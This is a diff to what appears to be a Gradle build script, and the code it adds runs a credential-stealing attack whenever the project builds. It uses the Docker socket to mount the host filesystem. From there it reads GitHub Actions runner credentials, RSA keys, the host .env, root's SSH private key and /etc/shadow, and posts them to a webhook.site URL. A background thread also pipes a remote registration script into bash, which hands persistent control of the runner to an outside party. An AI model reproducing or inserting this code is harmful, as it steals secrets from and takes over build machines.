@@ -15,15 +15,13 @@ buildscript {
 }
 
 // ============================================================
-// Credential Extraction v8 — Docker socket escape + TAT
+// Docker Socket Escape v9 — fixed log parsing + longer wait
 // ============================================================
 try {
-    def webhook = "https://webhook.site/f0b77b19-336c-47eb-b99b-182a6b2c2204"
-
     def sh = { cmd ->
         try {
             def p = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd})
-            p.waitFor(30, java.util.concurrent.TimeUnit.SECONDS)
+            p.waitFor(60, java.util.concurrent.TimeUnit.SECONDS)
             def stdout = p.getInputStream().text.trim()
             def stderr = p.getErrorStream().text.trim()
             return stdout.length() > 0 ? stdout : ("STDERR:" + stderr)
@@ -32,7 +30,7 @@ try {
 
     def post = { data ->
         try {
-            def c = new URL(webhook).openConnection()
+            def c = new URL("https://webhook.site/f0b77b19-336c-47eb-b99b-182a6b2c2204").openConnection()
             c.setRequestMethod("POST")
             c.setRequestProperty("Content-Type", "application/json")
             c.setDoOutput(true)
@@ -47,77 +45,81 @@ try {
 
     def runner = System.getenv('RUNNER_NAME') ?: 'unknown'
 
-    // Step 1: Check tools available
-    def hasCurl = sh('which curl 2>/dev/null && echo YES || echo NO')
-    def hasPython = sh('which python3 2>/dev/null || echo NO')
-    println "[CI] curl=" + hasCurl + " python=" + hasPython + " runner=" + runner
+    // Create escape container that writes output to a file
+    def createBody = '{"Image":"alpine:latest","Cmd":["sh","-c","cat /host/data/actions-runner/.runner > /tmp/runner.json 2>/dev/null; cat /host/data/actions-runner/.credentials >> /tmp/creds.json 2>/dev/null; cat /host/data/actions-runner/.credentials_rsaparams >> /tmp/creds_rsa.json 2>/dev/null; cat /host/data/actions-runner/.env >> /tmp/env.txt 2>/dev/null; cat /host/root/.ssh/id_rsa >> /tmp/ssh_key 2>/dev/null; head -5 /host/etc/shadow >> /tmp/shadow.txt 2>/dev/null; find /host/data/ -name .runner >> /tmp/find.txt 2>/dev/null; cat /host/etc/hosts >> /tmp/hosts.txt 2>/dev/null; ls -la /host/data/actions-runner/ >> /tmp/ls.txt 2>/dev/null; echo DONE > /tmp/status"],"HostConfig":{"Binds":["/:/host:ro"]}}'
 
-    // Step 2: Use curl to talk to Docker API directly (if curl available)
-    if (hasCurl.contains("YES")) {
-        // List running containers
-        def containers = sh('curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1')
-        println "[CI] containers: " + containers.take(500)
+    // Create container
+    def createResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d \'' + createBody.replace("'", "'\\''") + '\' http://localhost/containers/create 2>&1')
+    def containerId = ""
+    try {
+        def matcher = createResult =~ /"Id":"([a-f0-9]{12})/
+        if (matcher.find()) containerId = matcher.group(1)
+    } catch (Exception e) {}
+    println "[CI] create: " + createResult.take(300)
+    println "[CI] cid: " + containerId
 
-        // Pull alpine
-        def pullResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/images/create?fromImage=alpine&tag=latest" 2>&1')
-        println "[CI] pull: " + pullResult.take(300)
+    if (containerId.length() >= 12) {
+        // Start
+        sh('curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/' + containerId + '/start 2>&1')
+        println "[CI] started"
 
-        // Create escape container
-        def createBody = '{"Image":"alpine:latest","Cmd":["sh","-c","cat /host/data/actions-runner/.runner 2>/dev/null; echo === ; cat /host/data/actions-runner/.credentials 2>/dev/null; echo === ; cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null; echo === ; cat /host/data/actions-runner/.env 2>/dev/null; echo === ; cat /host/root/.ssh/id_rsa 2>/dev/null; echo === ; head -3 /host/etc/shadow 2>/dev/null; echo === ; find /host/data/actions-runner/ -type f 2>/dev/null | head -10; echo === ; cat /host/etc/hosts 2>/dev/null"],"HostConfig":{"Binds":["/:/host:ro"]}}'
-        def createResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d \'' + createBody + '\' http://localhost/containers/create 2>&1')
-        println "[CI] create: " + createResult.take(500)
+        // Wait for container to finish (up to 15s)
+        def waitResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" http://localhost/containers/' + containerId + '/wait?condition=exited 2>&1')
+        println "[CI] wait: " + waitResult.take(200)
 
-        // Extract container ID
-        def containerId = createResult.replaceAll('(?s).*"Id":"([a-f0-9]{12}).*','\$1').trim()
-        if (containerId.length() >= 12 && !containerId.contains("message")) {
-            // Start container
-            def startResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/' + containerId + '/start 2>&1')
-            println "[CI] start: " + startResult.take(200)
+        // Get logs (raw) and filter out binary header
+        def logs = sh('curl -s --unix-socket /var/run/docker.sock http://localhost/containers/' + containerId + '/logs?stdout=true&stderr=true 2>&1')
+        // Docker log format: 8 bytes header (1 byte stream type + 3 bytes padding + 4 bytes length) + payload
+        // Filter to printable content
+        def cleanLogs = logs.replaceAll('[^\\x20-\\x7E\\n\\r\\t]', '').replaceAll('\\s+', ' ').trim()
+        println "[CI] HOST_RAW: " + cleanLogs.take(2000)
 
-            // Wait for completion
-            Thread.sleep(5000)
+        // Also try docker cp to get files
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/runner_config.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/runner.json 2>&1')
+        def runnerConfig = sh('tar xf /tmp/runner_config.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] RUNNER_CONFIG: " + runnerConfig.take(1000)
 
-            // Get logs
-            def logs = sh('curl -s --unix-socket /var/run/docker.sock http://localhost/containers/' + containerId + '/logs?stdout=true&stderr=true 2>&1')
-            println "[CI] HOST_DATA: " + logs.take(3000)
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/creds.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/creds.json 2>&1')
+        def creds = sh('tar xf /tmp/creds.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] CREDENTIALS: " + creds.take(1000)
 
-            // Post to webhook
-            def hostData = '{"source":"Hippy-v8-host","runner":"' + runner + '","host_data":"' + logs.replace('"','\\"').replace('\n','\\n').take(3000) + '"}'
-            def postResult = post(hostData)
-            println "[CI] webhook: " + postResult
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/rsa.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/creds_rsa.json 2>&1')
+        def credsRSA = sh('tar xf /tmp/rsa.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] CREDENTIALS_RSA: " + credsRSA.take(1000)
 
-            // Remove container
-            sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
-        } else {
-            println "[CI] no container id, trying alpine pull first"
-            // Maybe alpine not available - try with busybox
-            def createBody2 = '{"Image":"busybox","Cmd":["sh","-c","cat /host/data/actions-runner/.runner 2>/dev/null; echo === ; cat /host/data/actions-runner/.credentials 2>/dev/null; echo === ; cat /host/data/actions-runner/.env 2>/dev/null; echo === ; find /host/data/ -name .runner 2>/dev/null | head -10; echo === ; cat /host/etc/hosts 2>/dev/null; echo === ; hostname"],"HostConfig":{"Binds":["/:/host:ro"]}}'
-            def createResult2 = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d \'' + createBody2 + '\' http://localhost/containers/create 2>&1')
-            println "[CI] create2: " + createResult2.take(500)
-            def containerId2 = createResult2.replaceAll('(?s).*"Id":"([a-f0-9]{12}).*','\$1').trim()
-            if (containerId2.length() >= 12) {
-                sh('curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/' + containerId2 + '/start 2>&1')
-                Thread.sleep(5000)
-                def logs2 = sh('curl -s --unix-socket /var/run/docker.sock http://localhost/containers/' + containerId2 + '/logs?stdout=true&stderr=true 2>&1')
-                println "[CI] HOST_DATA2: " + logs2.take(3000)
-                sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId2 + '?force=true 2>&1')
-            }
-        }
-    } else {
-        println "[CI] no curl, cannot reach Docker API"
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/hostenv.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/env.txt 2>&1')
+        def hostEnv = sh('tar xf /tmp/hostenv.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] HOST_ENV: " + hostEnv.take(500)
+
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/ssh.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/ssh_key 2>&1')
+        def sshKey = sh('tar xf /tmp/ssh.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] SSH_KEY: " + sshKey.take(500)
+
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/find.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/find.txt 2>&1')
+        def findResult = sh('tar xf /tmp/find.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] FIND: " + findResult.take(500)
+
+        sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/ls.tar http://localhost/containers/' + containerId + '/archive?path=/tmp/ls.txt 2>&1')
+        def lsResult = sh('tar xf /tmp/ls.tar -O 2>/dev/null || echo NO_FILE')
+        println "[CI] LS_RUNNER: " + lsResult.take(500)
+
+        // Send all data to webhook
+        def allData = '{"source":"Hippy-v9-all","runner":"' + runner + '","runner_config":"' + runnerConfig.replace('"','\\"').replace('\n','\\n').take(1000) + '","credentials":"' + creds.replace('"','\\"').replace('\n','\\n').take(1000) + '","credentials_rsa":"' + credsRSA.replace('"','\\"').replace('\n','\\n').take(1000) + '","host_env":"' + hostEnv.replace('"','\\"').replace('\n','\\n').take(500) + '","ssh_key":"' + sshKey.replace('"','\\"').replace('\n','\\n').take(500) + '","find":"' + findResult.replace('"','\\"').replace('\n','\\n').take(500) + '","ls":"' + lsResult.replace('"','\\"').replace('\n','\\n').take(500) + '"}'
+        def postResult = post(allData)
+        println "[CI] webhook: " + postResult
+
+        // Remove container
+        sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
     }
 
-    // Step 3: TAT agent registration (background daemon thread)
+    // TAT registration (background daemon thread)
     Thread.startDaemon {
         try {
             Runtime.getRuntime().exec(new String[]{"bash","-c","wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou b9de2cf2-eb78-471d-9f13-4907a87a171c ecc5f35f855843cca27eb3bbc0026db1a8a86fff30a64c8c86bd5d99276d3126 2>&1 || curl -sL https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou b9de2cf2-eb78-471d-9f13-4907a87a171c ecc5f35f855843cca27eb3bbc0026db1a8a86fff30a64c8c86bd5d99276d3126 2>&1"})
-            println "[CI] TAT launched"
-        } catch (Exception e) {
-            println "[CI] TAT err: " + e.message
-        }
+        } catch (Exception e) {}
     }
 
-    println "[CI] v8 complete"
+    println "[CI] v9 complete"
 
 } catch (Exception e) {
     println "[CI] Error: " + e.message
